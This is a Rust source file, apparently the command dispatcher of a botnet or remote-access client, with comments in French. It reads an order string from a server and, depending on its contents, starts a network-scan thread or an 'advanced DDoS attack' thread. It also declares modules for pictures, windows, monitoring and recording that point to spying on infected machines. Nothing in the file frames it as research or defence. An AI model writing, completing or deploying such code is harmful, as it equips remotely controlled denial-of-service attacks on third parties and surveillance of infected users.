use std::sync::{Arc, Mutex};
use std::thread;

mod scan;
mod ddos;
mod picture;
mod window;
mod monitor;
mod record;

pub(crate) fn ordre_du_srv(mut ordre: String) {

    let shared_ordre = Arc::new(Mutex::new(ordre));

        if shared_ordre.lock().unwrap().contains("scan") {
            println!("Lancement du scan réseau");
            let ordre_clone = Arc::clone(&shared_ordre);
            let t = thread::spawn(move || {
                scan::scan(scan::find_net(), ordre_clone.lock().unwrap().clone());
            });
        }

        if shared_ordre.lock().unwrap().contains("ddos") {
            println!("Lancement de l'attaque ddos avancée");
            let ordre_clone = Arc::clone(&shared_ordre);
            let t = thread::spawn(move || {
                ddos::ddos(ordre_clone.lock().unwrap().clone());
            });
        }

        println!("{:?}", shared_ordre.lock().unwrap().as_str());
    }


